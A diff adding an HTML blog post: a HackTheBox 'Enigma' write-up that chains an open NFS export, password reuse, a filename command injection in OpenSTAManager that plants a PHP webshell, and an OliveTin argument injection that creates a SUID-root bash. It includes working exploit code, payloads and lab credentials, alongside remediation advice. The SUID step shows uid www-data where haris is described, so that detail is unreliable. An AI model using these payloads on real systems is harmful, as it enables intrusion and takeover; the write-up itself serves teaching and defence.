@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Enigma — S. Markakis</title>
+<meta name="description" content="HackTheBox Enigma — an anonymous NFS export leaks onboarding creds, password reuse into webmail leaks CRM creds, an OpenSTAManager P7M command injection (CVE-2025-69212) lands a webshell, a cracked DB hash gives a user, and a root-run OliveTin automation tool executes attacker-controlled arguments for root.">
+<meta property="og:title" content="HTB: Enigma — S. Markakis">
+<meta property="og:description" content="HackTheBox Enigma — an anonymous NFS export leaks onboarding creds, password reuse into webmail leaks CRM creds, an OpenSTAManager P7M command injection (CVE-2025-69212) lands a webshell, a cracked DB hash gives a user, and a root-run OliveTin automation tool executes attacker-controlled arguments for root.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-enigma.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-enigma.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-enigma.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-enigma.html">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.74rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Enigma",
+  "description": "HackTheBox Enigma — an anonymous NFS export leaks onboarding creds, password reuse into webmail leaks CRM creds, an OpenSTAManager P7M command injection (CVE-2025-69212) lands a webshell, a cracked DB hash gives a user, and a root-run OliveTin automation tool executes attacker-controlled arguments for root.",
+  "datePublished": "2026-09-09",
+  "dateModified": "2026-09-09",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-enigma.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-enigma.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-enigma"
+  },
+  "timeRequired": "PT8M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Back to posts</a>
+
+  <div class="post-header">
+    <h1>HTB: Enigma</h1>
+    <div class="post-meta">
+      <span class="date">September 9, 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-lin">Linux</span>
+      <span class="tag">Easy</span>
+      <span>&nbsp;8 min read</span>
+    </div>
+  </div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Enigma is "easy" only on the difficulty label — it's a genuinely satisfying chain where each service coughs up the key to the next, and nothing along the way is a memory-corruption bug. An <strong>unauthenticated NFS export</strong> hands over onboarding paperwork with a temp password; <strong>password reuse</strong> walks that into a second user's webmail, which leaks credentials for a CRM; the CRM is a patched-but-still-vulnerable <strong>OpenSTAManager</strong> (CVE-2025-69212) that turns a ZIP upload into a webshell; a database password gets us a real user; and root is a misconfigured <strong>OliveTin</strong> automation tool that happily runs root-level commands — with attacker-supplied arguments — for anyone who can reach its socket.
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-enigma/img-attack-chain.webp" type="image/webp"><img class="screenshot" src="assets/htb-enigma/img-attack-chain.png" alt="Enigma compromise chain: an anonymous NFS export leaks kevin's onboarding password, reuse gives sandra's webmail which leaks OpenSTAManager admin creds, CVE-2025-69212 drops a webshell as www-data, config.inc.php DB creds crack haris's hash for user.txt, and a root-run OliveTin backup_database action injects db_pass into a shell for root.txt" width="1568" height="591" loading="lazy" decoding="async"></picture>
+
+  <div class="chain">
+    <span class="chain-node">NFS :2049</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">kevin (onboarding pdf)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">sandra (reuse)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">OpenSTAManager RCE</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">www-data</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">DB hash → haris</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">OliveTin</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Reconnaissance</h2>
+
+  <p>The scan is a mail-server-shaped surface — SSH, HTTP, POP3/IMAP (Dovecot), and crucially <strong>NFS on 2049</strong>. The TLS certs and an HTTP redirect name the host <code>enigma.htb</code>.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nmap -p- -sCV &lt;TARGET_IP&gt;</span>
+<span class="po">22/tcp   open  ssh       OpenSSH 9.6p1 Ubuntu
+80/tcp   open  http      nginx 1.24.0  (redirect → http://enigma.htb/)
+110/tcp  open  pop3      Dovecot pop3d
+143/tcp  open  imap      Dovecot imapd
+993/995  open  ssl/imap, ssl/pop3
+2049/tcp open  nfs       (RPC 100003 v3,4)</span></div>
+  </div>
+
+  <p>A vhost fuzz on <code>enigma.htb</code> turns up <strong>mail001</strong> (Roundcube webmail) and later <strong>support_001</strong>. Add them to <code>/etc/hosts</code> and move on to the NFS export.</p>
+
+  <!-- ══ NFS ══ -->
+  <h2>Initial Access — Anonymous NFS Leak</h2>
+
+  <p><code>showmount</code> lists a single export with the tell-tale <code>*</code> — <strong>no client restriction</strong>, anyone can mount it:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">showmount → mount</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">showmount -e &lt;TARGET_IP&gt;</span>
+<span class="po">Export list for &lt;TARGET_IP&gt;:
+/srv/nfs/onboarding *</span>
+<span class="pd">$ </span><span class="pc">sudo mount -t nfs &lt;TARGET_IP&gt;:/srv/nfs/onboarding /tmp/onboarding -o ro</span>
+<span class="pd">$ </span><span class="pc">ls -la /tmp/onboarding</span>
+<span class="po">-rw-r--r-- 1 root root 1751 Feb 19 14:53 New_Employee_Access.pdf</span></div>
+  </div>
+
+  <p>One world-readable file, named exactly like the kind of onboarding paperwork that ships a temp password. <code>pdftotext</code> confirms it:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">pdftotext New_Employee_Access.pdf -</span>
+    </div>
+    <div class="term-body"><span class="po">Enigma Corp IT Department — New Employee System Access
+Employee: Kevin Mitchell
+
+Webmail Access
+URL:      http://mail001.enigma.htb
+Username: </span><span class="pg">kevin</span><span class="po">
+Password: </span><span class="pg">Enigma2024!</span><span class="po">
+
+Please change your password upon first login.</span></div>
+  </div>
+
+  <div class="alert alert-warn">An NFS export with <code>*</code> and no <code>root_squash</code> consideration is the entire foothold. Exports should be pinned to specific hosts/subnets, mounted read-only where possible, and — obviously — never used to stage credential documents.</div>
+
+  <!-- ══ REUSE ══ -->
+  <h2>Password Reuse — kevin → sandra</h2>
+
+  <p>The PDF's creds log into Roundcube as kevin, whose inbox is a bland welcome email from <strong>Sarah in Accounts</strong>. That's the lead: Sarah was onboarded the same way Kevin was, and the document told <em>Kevin</em> to change his temp password — nothing suggests anyone actually did. The cheap hypothesis is password reuse across staff, and it pays off:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">sandra : Enigma2024!</span>
+    </div>
+    <div class="term-body"><span class="po">Login to http://mail001.enigma.htb as </span><span class="pg">sandra : Enigma2024!</span><span class="po">  → success</span></div>
+  </div>
+
+  <p>Sandra's mailbox has the payoff — a <strong>"Re: OpenSTAManager Access Request"</strong> from IT with credentials for a third app:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">sandra's inbox</span>
+    </div>
+    <div class="term-body"><span class="po">Re: OpenSTAManager Access Request
+
+URL:      http://support_001.enigma.htb
+Username: </span><span class="pg">admin</span><span class="po">
+Password: </span><span class="pg">Ne3s4rtars78s</span></div>
+  </div>
+
+  <div class="alert alert-info">Roundcube here is 1.6.16 — the <em>patched</em> release, not a vulnerable one. The way forward wasn't a webmail CVE; it was reading the mail. Enumeration isn't only about versions.</div>
+
+  <!-- ══ OSM RCE ══ -->
+  <h2>Foothold — OpenSTAManager P7M Injection (CVE-2025-69212)</h2>
+
+  <p><code>support_001</code> runs <strong>OpenSTAManager 2.9.8</strong>, and the admin creds log straight in. That version is vulnerable to <strong>CVE-2025-69212</strong>, an OS command injection in P7M (signed-XML) file processing. The mechanism: when the app decodes a <code>.p7m</code> file it shells out to OpenSSL, interpolating the <em>filename</em> into the command with no sanitisation:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">src/Util/XML.php — decodeP7M()</span>
+    </div>
+    <div class="term-body"><span class="po">$output_file = $directory.'/'.basename($file, '.p7m');
+</span><span class="pr">exec('openssl smime -verify -noverify -in "'.$file.'" -inform DER -out "'.$output_file.'"', $output, $cmd);</span></div>
+  </div>
+
+  <p>The <code>importFE_ZIP</code> plugin extracts an uploaded ZIP and feeds each <code>.p7m</code> entry's name into that <code>exec()</code>. So a ZIP whose <em>entry name</em> closes the quote and injects a command is arbitrary execution. One constraint: PHP's <code>ZipArchive::extractTo()</code> splits on <code>/</code>, so the payload must be slash-free — <code>cd files &amp;&amp; …</code> instead of an absolute path:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">build the malicious zip</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">python3 - &lt;&lt;'EOF'
+import zipfile
+cmd = 'cd files &amp;&amp; echo \'&lt;?php system($_GET["c"]); ?&gt;\' &gt; SHELL.php'
+fn  = f'invoice.p7m";{cmd};echo ".p7m'
+zipfile.ZipFile('exploit.zip','w').writestr(fn, b"DUMMY_P7M_CONTENT")
+EOF</span></div>
+  </div>
+
+  <p>Reading the filename against the vulnerable line: <code>invoice.p7m"</code> closes the quote wrapping the benign name, <code>;{cmd};</code> runs the payload as its own statement, and the trailing <code>echo ".p7m</code> absorbs the leftover <code>-inform DER …</code> as harmless arguments so nothing throws a syntax error. Upload it through the <strong>Importazione FE</strong> picker (a plain <code>POST /actions.php</code>, <code>op=save</code>, file field <code>blob</code>):</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">upload &amp; confirm RCE</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -b osm.cookies -F op=save -F id_module=14 -F id_plugin=48 \
+     -F 'blob=@exploit.zip;type=application/zip' http://support_001.enigma.htb/actions.php</span>
+<span class="po">{"error":"... non è un file ZIP valido."}   </span><span class="pco"># fires AFTER exec() already ran</span>
+<span class="pd">$ </span><span class="pc">curl "http://support_001.enigma.htb/files/SHELL.php?c=id"</span>
+<span class="po">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></div>
+  </div>
+
+  <div class="alert alert-info">That XML-parse error is <em>confirmation</em>, not failure — the decoder chokes on <code>DUMMY_P7M_CONTENT</code> because it isn't valid signed XML, but that check happens only after our injected filename has already run through <code>exec()</code>. The webshell is on disk.</div>
+
+  <!-- ══ WWW-DATA → HARIS ══ -->
+  <h2>www-data → haris — Database Password Reuse</h2>
+
+  <p>OpenSTAManager's <code>config.inc.php</code> holds its MySQL login, and OSM stores its own users as bcrypt in the <code>zz_users</code> table:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">config → db → hashes</span>
+    </div>
+    <div class="term-body"><span class="pd">www-data$ </span><span class="pc">grep -E 'db_(username|password|name)' config.inc.php</span>
+<span class="po">$db_username = '</span><span class="pg">brollin</span><span class="po">';  $db_password = '</span><span class="pg">Fri3nds@9099</span><span class="po">';  $db_name = 'openstamanager';</span>
+<span class="pd">www-data$ </span><span class="pc">mysql -u brollin -p'Fri3nds@9099' openstamanager -N -e \
+     'SELECT username,password FROM zz_users;'</span>
+<span class="po">admin  $2y$10$rTJVUNyGGKPlhw2cFdf5Ae...
+</span><span class="pr">haris  $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC</span></div>
+  </div>
+
+  <p>haris is a real system user too. His bcrypt falls to rockyou in seconds:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">hashcat -m 3200</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">hashcat -m 3200 haris.hash rockyou.txt</span>
+<span class="po">$2y$10$WHf1T79sxjsZongUKT2j...:</span><span class="pg">bestfriends</span></div>
+  </div>
+
+  <p>SSH is public-key only, so <code>su haris</code> is the way in. The user flag lives in his home:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">su haris → user.txt</span>
+    </div>
+    <div class="term-body"><span class="pd">www-data$ </span><span class="pc">su haris        </span><span class="pco"># bestfriends</span>
+<span class="pu">haris</span><span class="ps">@</span><span class="ph">enigma</span><span class="ps">:~$ </span><span class="pc">cat user.txt</span><span class="po">
+</span><span class="pg">[redacted — user flag]</span></div>
+  </div>
+
+  <!-- ══ ROOT ══ -->
+  <h2>Root — A Root Automation Tool That Trusts Its Input</h2>
+
+  <p>haris has no sudo. Process enumeration turns up something running as root: <code>/usr/local/bin/OliveTin</code> — a web-based "run buttons for shell commands" tool, listening on <code>127.0.0.1:1337</code>. Its config (<code>/etc/OliveTin/config.yaml</code>) has two damning settings and one dangerous action:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/etc/OliveTin/config.yaml (excerpt)</span>
+    </div>
+    <div class="term-body"><span class="pr">authRequireGuestsToLogin: false</span><span class="po">     </span><span class="pco"># guests can do anything</span><span class="po">
+defaultPermissions: { exec: true }
+
+  - title: Backup Database
+    id: </span><span class="pr">backup_database</span><span class="po">
+    shell: "mysqldump -u {{ db_user }} -p'</span><span class="pr">{{ db_pass }}</span><span class="po">' {{ db_name }} &gt; /opt/backups/backup.sql"
+    arguments:
+      - name: db_pass
+        type: </span><span class="pr">password</span><span class="po">        </span><span class="pco"># NOT an ascii_identifier — never sanitised</span></div>
+  </div>
+
+  <p>Two of the three arguments are <code>ascii_identifier</code> (validated), but <code>db_pass</code> is a <strong>password</strong> type — free-form, no character filtering — and it's dropped straight into a shell template. Close the <code>-p'…'</code> quote and inject.</p>
+
+  <div class="alert alert-warn">The subtlety that cost me time: this action is <strong>only reachable as haris</strong>. From the <code>www-data</code> webshell, every connection to <code>127.0.0.1:1337</code> simply hung — a host firewall owner-match drops the web user's traffic to OliveTin. That's exactly why the box <em>needs</em> the <code>su haris</code> step; it isn't optional colour. As haris, the API returns <code>200</code> immediately.</div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-enigma/img-olivetin-privesc.webp" type="image/webp"><img class="screenshot" src="assets/htb-enigma/img-olivetin-privesc.png" alt="OliveTin privesc diagram: www-data has RCE but is firewalled from port 1337, haris can reach the OliveTin API which runs the backup_database action as root guest, and the unsanitized db_pass password-type argument breaks out of the mysqldump shell to install a SUID root bash" width="1567" height="643" loading="lazy" decoding="async"></picture>
+
+  <p>OliveTin speaks ConnectRPC. The async <code>StartAction</code> method silently dropped my <code>actionId</code>; the working call is <strong><code>StartActionAndWait</code></strong>. Inject through <code>db_pass</code> to drop a SUID-root bash:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">StartActionAndWait — as haris</span>
+    </div>
+    <div class="term-body"><span class="pu">haris</span><span class="ps">@</span><span class="ph">enigma</span><span class="ps">:~$ </span><span class="pc">curl -s http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
+     -H 'Content-Type: application/json' --data '{
+       "actionId":"backup_database",
+       "arguments":[
+         {"name":"db_user","value":"backup_svc"},
+         {"name":"db_pass","value":"x'"'"' ; install -m 4755 /bin/bash /tmp/.bs ; #"},
+         {"name":"db_name","value":"production"}]}'</span>
+<span class="po">{"logEntry":{"actionTitle":"Backup Database","exitCode":0,"user":"</span><span class="pr">guest</span><span class="po">", ...}}</span></div>
+  </div>
+
+  <p>The template renders as <code>mysqldump -u backup_svc -p'x' ; install -m 4755 /bin/bash /tmp/.bs ; #' production …</code> — the <code>install</code> runs as root and drops a setuid bash. Then <code>-p</code> keeps the effective UID at 0:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">SUID bash → root</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">/tmp/.bs -p -c 'id; cat /root/root.txt'</span>
+<span class="po">uid=33(www-data) </span><span class="pg">euid=0(root)</span><span class="po"> groups=33(www-data)
+</span><span class="pg">[redacted — root flag]</span></div>
+  </div>
+
+  <div class="alert alert-success">"Run buttons for shell commands" is a tidy idea until the buttons take free-form arguments, run as root, and accept unauthenticated guests. Any one of those turned off stops this: validate/whitelist argument values, never run the daemon as root, and require auth for exec. Security-by-obscurity (binding to loopback) only bought a firewall rule that one <code>su</code> defeats.</div>
+
+  <!-- ══ WRAP ══ -->
+  <h2>Why it worked</h2>
+
+  <table class="st">
+    <tr><th>Stage</th><th>Root cause</th></tr>
+    <tr><td>→ kevin</td><td>NFS export shared to <code>*</code> with a credential document inside it (CWE-552 / CWE-284)</td></tr>
+    <tr><td>kevin → sandra</td><td>Shared onboarding temp password reused across staff, never rotated (CWE-521 / CWE-259)</td></tr>
+    <tr><td>→ www-data</td><td>OpenSTAManager ≤2.9.8 interpolates a <code>.p7m</code> filename into <code>exec()</code> — CVE-2025-69212 (CWE-78)</td></tr>
+    <tr><td>→ haris</td><td>DB password in config + a crackable bcrypt reused as the system password (CWE-522)</td></tr>
+    <tr><td>→ root</td><td>Root-run OliveTin with guest exec and an unsanitised <code>password</code>-type argument in a shell template (CWE-78 / CWE-269 / CWE-306)</td></tr>
+  </table>
+
+  <h2>Key commands</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># 1. NFS → onboarding creds</span>
+<span class="pc">showmount -e &lt;IP&gt; ; sudo mount -t nfs &lt;IP&gt;:/srv/nfs/onboarding /tmp/onboarding -o ro</span>
+<span class="pc">pdftotext /tmp/onboarding/New_Employee_Access.pdf -   # kevin:Enigma2024!</span>
+
+<span class="pco"># 2. reuse → sandra webmail → OpenSTAManager admin:Ne3s4rtars78s</span>
+
+<span class="pco"># 3. CVE-2025-69212 → webshell (www-data)</span>
+<span class="pc">zip entry name: invoice.p7m";cd files &amp;&amp; echo '&lt;?php system($_GET[c]); ?&gt;' &gt; SHELL.php;echo ".p7m</span>
+<span class="pc">POST /actions.php  op=save id_module=14 id_plugin=48 blob=@exploit.zip</span>
+
+<span class="pco"># 4. DB creds → crack → haris</span>
+<span class="pc">mysql -u brollin -p'Fri3nds@9099' openstamanager -e 'SELECT username,password FROM zz_users;'</span>
+<span class="pc">hashcat -m 3200 haris.hash rockyou.txt   # bestfriends → su haris</span>
+
+<span class="pco"># 5. OliveTin (as haris) → root</span>
+<span class="pc">curl http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
+  --data '{"actionId":"backup_database","arguments":[{"name":"db_pass",
+  "value":"x'"'"' ; install -m 4755 /bin/bash /tmp/.bs ; #"}, ...]}'</span>
